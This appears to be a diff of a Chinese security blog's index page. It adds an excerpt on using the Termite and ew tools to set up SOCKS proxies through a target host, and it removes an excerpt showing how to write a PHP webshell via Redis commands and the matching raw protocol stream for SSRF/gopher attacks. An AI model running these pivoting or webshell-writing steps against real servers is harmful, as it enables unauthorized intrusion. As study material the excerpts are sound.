@@ -117,6 +117,74 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2018/02/03/termite-socks.html" >Termite代理工具</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2018-02-03  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>网上讲ew的方法比较多，周末看了下作者的视频，感觉termite也挺有意思的</p>
+<p>正向socks v5服务器</p>
+<p><a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a><br>以上面这个文章作为例子，来说下对应的转发与代理</p>
+<p>如果目标有一个外网IP：</p>
+<p>ew来说建立socks代理服务：</p>
+<p><code>ew -s ssocksd -l 8888</code></p>
+<p>Termite:</p>
+<pre class="line-numbers language-none"><code class="language-none">agent_exe -l 8888
+admin_exe -c [tartet_ip] -p 8888
+然后在admin_exe里面有一个操作界面，可以使用show看下当前节点分布，然后如下操作：
+goto 1
+socks 1080
+此时VPS上面的1080就架设了一个服务器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="反弹socks服务器"><a href="#反弹socks服务器" class="headerlink" title="反弹socks服务器"></a>反弹socks服务器</h2><p>假设目标机器没有公网IP，但是可以访问内网资源，ew的步骤是这样的：</p>
+	
+
+	</div>
+  <a type="button" href="/2018/02/03/termite-socks.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>网上讲ew的方法比较多，周末看了下作者的视频，感觉termite也挺有意思的</p>
+<p>正向socks v5服务器</p>
+<p><a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a><br>以上面这个文章作为例子，来说下对应的转发与代理</p>
+<p>如果目标有一个外网IP：</p>
+<p>ew来说建立socks代理服务：</p>
+<p><code>ew -s ssocksd -l 8888</code></p>
+<p>Termite:</p>
+<pre class="line-numbers language-none"><code class="language-none">agent_exe -l 8888
+admin_exe -c [tartet_ip] -p 8888
+然后在admin_exe里面有一个操作界面，可以使用show看下当前节点分布，然后如下操作：
+goto 1
+socks 1080
+此时VPS上面的1080就架设了一个服务器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="反弹socks服务器"><a href="#反弹socks服务器" class="headerlink" title="反弹socks服务器"></a>反弹socks服务器</h2><p>假设目标机器没有公网IP，但是可以访问内网资源，ew的步骤是这样的：</p>
+	
+	</div>
+  <a type="button" href="/2018/02/03/termite-socks.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2018/02/02/xxe.html" >XXE学习笔记</a>
 		</h3>
 		</div>
@@ -885,150 +953,6 @@ latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/12/05/redis-crontab.html" >redis hacker</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-12-05  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>Orange在BH大会的paper上面这么说的:</p>
-<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
-  HTTP based protocol:
-  	Elastic, CouchDB, Mongodb, Docker
-  
-  Text-based protocol:
-    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>Ph在他<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p>
-<ul>
-<li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
-<li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
-<li>然后再正常使用redis来攻击</li>
-</ul>
-<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p>
-<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
-redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
-redis-cli -h 127.0.0.1 config set dbfilename shell.php
-redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
-redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>然后得到的数据流如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">*1\r
-$8\r
-flushall\r
-*4\r
-$6\r
-config\r
-$3\r
-set\r
-$3\r
-dir\r
-$8\r
-&#x2F;var&#x2F;www\r
-*4\r
-$6\r
-config\r
-$3\r
-set\r
-$10\r
-dbfilename\r
-$9\r
-shell.php\r
-*3\r
-$3\r
-set\r
-$3\r
-web\r
-$18\r
-&lt;?php phpinfo();?&gt;\r
-*1\r
-$4\r
-save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>Orange在BH大会的paper上面这么说的:</p>
-<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
-  HTTP based protocol:
-  	Elastic, CouchDB, Mongodb, Docker
-  
-  Text-based protocol:
-    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>Ph在他<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p>
-<ul>
-<li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
-<li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
-<li>然后再正常使用redis来攻击</li>
-</ul>
-<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p>
-<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
-redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
-redis-cli -h 127.0.0.1 config set dbfilename shell.php
-redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
-redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>然后得到的数据流如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">*1\r
-$8\r
-flushall\r
-*4\r
-$6\r
-config\r
-$3\r
-set\r
-$3\r
-dir\r
-$8\r
-&#x2F;var&#x2F;www\r
-*4\r
-$6\r
-config\r
-$3\r
-set\r
-$10\r
-dbfilename\r
-$9\r
-shell.php\r
-*3\r
-$3\r
-set\r
-$3\r
-web\r
-$18\r
-&lt;?php phpinfo();?&gt;\r
-*1\r
-$4\r
-save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1086,7 +1010,7 @@ save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></sp
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>52</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>53</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -1107,6 +1031,10 @@ save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></sp
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/05/26/cobaltstrike-learn.html" ><i class="fa fa-file-o"></i>CobaltStrike通信学习笔记</a>
+      </li>
+    
+      <li>
         <a href="/2023/05/10/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
       </li>
     
@@ -1120,10 +1048,6 @@ save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></sp
     
       <li>
         <a href="/2023/03/27/pinfish-and-osx-pentest.html" ><i class="fa fa-file-o"></i>记一次钓鱼演练和OS X下的渗透技巧</a>
-      </li>
-    
-      <li>
-        <a href="/2023/03/03/github-trick.html" ><i class="fa fa-file-o"></i>Github搜索小技巧</a>
       </li>
     
   </ul>
